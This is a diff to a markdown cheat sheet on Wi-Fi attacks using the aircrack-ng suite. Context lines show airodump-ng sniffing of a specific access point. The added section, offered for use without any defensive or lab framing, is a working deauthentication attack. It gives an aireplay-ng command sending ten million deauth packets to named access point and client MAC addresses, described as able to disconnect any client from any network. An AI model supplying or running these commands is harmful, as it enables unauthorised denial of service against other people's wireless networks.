@@ -197,7 +197,9 @@ airodump-ng --band abg wlan0mon
 ```
 sudo airdump-ng wlan0mon
 ```
->Targeted Packet Sniffing
+
+
+### Targeted Packet Sniffing
 ```
 airodump-ng --bssid B4:B0:24:74:21:7C --channel 1 --write testA wlan0mon
 
@@ -212,6 +214,25 @@ channel - channel number <br>
 write - file name to save <br>
 wlan0mon - interface name <br>
 
+### Deauthentication Attack
+
+- Disconnect any clint from any network
+- work on encrypeted networks (WEP, WPA & WPA2)
+
+**Open terminal - 1**
+> Targeted Packet Sniffing With out SAVE
+```
+airodump-ng --bssid 70:97:41:DA:E0:5B --channel 6 wlan0mon 
+```
+**Open terminal - 2**
+> Deauth attack
+```
+aireplay-ng --deauth 10000000 -a 70:97:41:DA:E0:5B  -c 40:49:0F:45:D7:B5 wlan0mon 
+```
+deauth - sending deauth packets number <br>
+-a - Network MAC Address <br>
+-c - Target MAC Address <br>
+wlan0mon - interface name <br>
 
 
 ---
